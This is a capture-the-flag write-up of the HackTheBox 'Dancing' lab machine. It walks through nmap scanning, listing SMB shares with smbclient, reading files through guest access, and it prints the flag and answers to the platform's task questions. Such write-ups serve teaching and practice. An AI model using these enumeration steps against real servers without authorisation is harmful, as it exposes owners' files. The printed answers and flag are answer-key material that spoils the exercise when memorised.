---
title: HackTheBox Dancing Writeup
authors: Samarth
categories: [HackTheBox , Starting Point - Tier 0]
tags: [Linux, SMB, Reconnaissance, Anonymous/Guest Access]
math: true
mermaid: true
---

![Dancing-HTB](/assets/images/starting-point/Dancing-HTB/banner.png)

## TL;DR

This writeup is based on the [__Dancing__](https://app.hackthebox.com/starting-point){:target="_blank"} machine, an easy-rated Windows box on Hack The Box. I began by scanning the target and found open `SMB ports (135, 139, and 445)`. Enumerating `SMB shares` revealed an accessible share named `WorkShares`, which contained directories belonging to two users: `Amy.J` and `James.P`. Inside these directories, I found two files: `worknotes.txt` and `flag.txt`. I downloaded `flag.txt`, read its contents, and captured the flag.


## Scanning Network

I started with a Nmap scan, I found ports 135, 139, 445 as Windows RPC, NetBIOS-ssn and Microsoft-ds, respectively. Let’s see the Nmap results.

```bash
nmap -sC -sV -A -T4 -Pn 10.129.129.86 -oN scan/normal.scan
Starting Nmap 7.94 ( https://nmap.org ) at 2025-02-15 12:38 IST
Nmap scan report for 10.129.129.86
Host is up (0.22s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4h00m00s
| smb2-time: 
|   date: 2025-02-15T11:09:03
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

## Enumeration

`Windows RPC` is used for remote procedure calls on Windows systems. It's often associated with various Windows services. I can enumerate `RPC` service further using `rpcclient` or `wmiexec`.

`NetBION-ssn` is used for file and printer sharing in older Windows versions. NetBIOS could allow for enumeration of shares and users on the system. I can enumerate shares, users and other information using `nmblookup` or `enum4linux`.

`Microsoft-DS` is used by modern versions of Windows for SMB (Server Message Block). I can enumerate SMB shares, users and more using `smbclient` or `smbmap`.

Let's start wby checking available `SMB` shares with `smbclient`.

```bash
smbclient -L //10.129.129.86 --option='client min protocol=SMB2'        

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
```

## Exploitation

The `WorkShares` share is accessible, so I attempted to connect to it.

```bash
smbclient \\\\10.129.129.86\\WorkShares --option='client min protocol=SMB2'
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
mkfifo         more           mput           newer          notify         
open           posix          posix_encrypt  posix_open     posix_mkdir    
posix_rmdir    posix_unlink   posix_whoami   print          prompt         
put            pwd            q              queue          quit           
readlink       rd             recurse        reget          rename         
reput          rm             rmdir          showacls       setea          
setmode        scopy          stat           symlink        tar            
tarmode        timeout        translate      unlock         volume         
vuid           wdel           logon          listconnect    showconnect    
tcon           tdis           tid            utimes         logoff         
..             !              
```

I listed the files inside the `WorkShares` directory:

```bash
smbclient \\\\10.129.72.82\\WorkShares --option='client min protocol=SMB2'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 13:52:01 2021
  ..                                  D        0  Mon Mar 29 13:52:01 2021
  Amy.J                               D        0  Mon Mar 29 14:38:24 2021
  James.P                             D        0  Thu Jun  3 14:08:03 2021

		5114111 blocks of size 4096. 1734359 blocks available
```

There are two directories, `Amy.J` and `James.P`. I explored their contents.

```bash
smb: \> cd Amy.J
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 14:38:24 2021
  ..                                  D        0  Mon Mar 29 14:38:24 2021
  worknotes.txt                       A       94  Fri Mar 26 16:30:37 2021
5114111 blocks of size 4096. 1734197 blocks available
smb: \Amy.J\> get worknotes.txt 
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \Amy.J\> cd ..
smb: \> cd James.P\
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 14:08:03 2021
  ..                                  D        0  Thu Jun  3 14:08:03 2021
  flag.txt                            A       32  Mon Mar 29 14:56:57 2021
5114111 blocks of size 4096. 1734197 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \James.P\> 
```

I have found two files named as `worknotes.txt` and `flag.txt` which means I have got the flag.

```bash
cat flag.txt     
5f61c10dffbc77a704d76016a22f1664  
```

## Tasks

### What does the 3-letter acronym SMB stand for?

```plaintext
Server Message Block
```

### What port does SMB use to operate at?

```plaintext
445
```

### What is the service name for port 445 that came up in our Nmap scan?

```plaintext
microsoft-ds
```

### What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?

```plaintext
-L
```

### How many shares are there on Dancing?

```plaintext
4
```

### What is the name of the share we are able to access in the end with a blank password?

```plaintext
WorkShares
```

### What is the command we can use within the SMB shell to download the files we find?

```plaintext
get
```

### Submit root flag

```plaintext
5f61c10dffbc77a704d76016a22f1664
```

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.